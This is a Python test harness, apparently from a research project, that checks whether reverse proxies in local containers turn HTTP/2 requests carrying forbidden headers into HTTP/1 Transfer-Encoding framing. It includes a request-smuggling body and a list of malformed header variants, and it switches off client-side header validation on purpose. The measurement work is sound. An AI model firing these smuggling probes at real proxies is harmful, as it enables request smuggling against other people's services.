#!/usr/bin/env python3
# Phage: the HTTP/2 downgrade half of the honor matrix.
# License: Apache-2.0 License

"""Measure which proxies carry an HTTP/2-forbidden framing header down to HTTP/1.

HTTP/2 has no chunked encoding and no `Transfer-Encoding`. RFC 9113 section 8.2.2 says
a client MUST NOT send connection-specific fields and a receiver that sees one MUST
treat the message as malformed. So on this axis the interesting behaviour is not which
spelling of `chunked` a proxy honors. It is whether the proxy MINTS an HTTP/1 framing
header out of a request that was never allowed to carry one, which hands the origin a
message the client could not have written in HTTP/1 at all.

Client speaks h2c with header validation off, because a conformant HTTP/2 client
refuses to put these fields on the wire and that refusal is exactly what a real
attacker does not have. Same byte-recording origin and same container harness as the
HTTP/1 front half, so the two verdicts are directly comparable.

Usage: python matrix/run_fronts_h2.py [--only nginx] [--json matrix/fronts_h2.json]
"""

import argparse
import json
import socket
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

import run_fronts  # noqa: E402
from fronts_h2 import FRONTS_H2  # noqa: E402
from h2.config import H2Configuration  # noqa: E402
from h2.connection import H2Connection  # noqa: E402

BODY = b"0\r\n\r\nGET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n"

# name, value, and what it is testing. A None name is the framing-only control: a
# well-formed h2 request, which must come out the other side with no Transfer-Encoding.
H2_VARIANTS = [
    ("none (control)", None, None),
    ("TE chunked", "transfer-encoding", "chunked"),
    ("TE chunked<TAB>", "transfer-encoding", "chunked\t"),
    ("TE uppercase name", "Transfer-Encoding", "chunked"),
    ("connection keep-alive", "connection", "keep-alive"),
    ("te chunked", "te", "chunked"),
    ("keep-alive header", "keep-alive", "timeout=5"),
    ("upgrade h2c", "upgrade", "h2c"),
]


def probe(port: int, name, value, settle: float = 0.4):
    """One h2c request. Returns (h1_head_the_front_emitted, h2_response_bytes, error)."""
    cfg = H2Configuration(
        client_side=True,
        header_encoding="utf-8",
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
        validate_inbound_headers=False,
        normalize_inbound_headers=False,
    )
    conn = H2Connection(config=cfg)
    conn.initiate_connection()
    headers = [
        (":method", "POST"),
        (":scheme", "http"),
        (":authority", "lab"),
        (":path", "/carrier"),
        ("content-length", str(len(BODY))),
    ]
    if name is not None:
        headers.append((name, value))
    conn.send_headers(1, headers, end_stream=False)
    conn.send_data(1, BODY, end_stream=True)

    with run_fronts._lock:
        run_fronts.CAPTURED.clear()
    out = b""
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=5)
        s.sendall(conn.data_to_send())
        s.settimeout(2.5)
        while True:
            try:
                d = s.recv(65536)
            except OSError:
                break
            if not d:
                break
            out += d
        s.close()
    except OSError as exc:
        return b"", b"", f"{type(exc).__name__}: {exc}"
    time.sleep(settle)
    with run_fronts._lock:
        return (run_fronts.CAPTURED[0] if run_fronts.CAPTURED else b""), out, None


def classify(head: bytes, name) -> str:
    """MINTS-TE    the front produced an HTTP/1 Transfer-Encoding from an h2 request
    forwarded    the tested field reached HTTP/1 unchanged, without minting framing
    stripped     the front dropped it, which is what RFC 9113 asks for
    no-forward   nothing reached the origin (the front refused the request)"""
    if not head:
        return "no-forward"
    low = head.lower()
    has_te = b"\ntransfer-encoding:" in low
    if has_te:
        return "MINTS-TE"
    if name and (b"\n" + name.lower().encode() + b":") in low:
        return "forwarded"
    return "stripped"


def run(spec) -> dict:
    row = {"name": spec["name"], "id": spec["id"], "reachable": False, "results": {}}
    print(f"  {spec['name']}")
    ok, cfgdir = run_fronts.start(spec)
    try:
        if not ok:
            row["error"] = "failed to start"
            return row
        row["reachable"] = True
        for label, name, value in H2_VARIANTS:
            head, _resp, err = probe(spec["port"], name, value)
            verdict = f"error: {err}" if err else classify(head, name)
            row["results"][label] = verdict
            print(f"    {label:22} {verdict}")
    finally:
        run_fronts.docker("rm", "-f", run_fronts.CONTAINER)
        if cfgdir:
            import shutil

            shutil.rmtree(cfgdir, ignore_errors=True)
    return row


def main() -> int:
    ap = argparse.ArgumentParser(description="HTTP/2 downgrade half")
    ap.add_argument("--only")
    ap.add_argument("--json", default="matrix/fronts_h2.json")
    args = ap.parse_args()

    specs = FRONTS_H2
    if args.only:
        want = [s.strip().lower() for s in args.only.split(",")]
        specs = [s for s in specs if any(w in s["name"].lower() for w in want)]

    stop = threading.Event()
    threading.Thread(target=run_fronts.origin, args=(stop,), daemon=True).start()
    time.sleep(0.3)
    print(f"measuring {len(specs)} front(s) over h2c")
    try:
        rows = [run(s) for s in specs]
    finally:
        stop.set()

    Path(args.json).write_text(json.dumps(rows, indent=2) + "\n")
    print(f"\nwrote {args.json}")
    minted = sorted({r["name"] for r in rows if "MINTS-TE" in r["results"].values()})
    print(f"fronts that mint an HTTP/1 Transfer-Encoding from h2: {minted or 'none'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
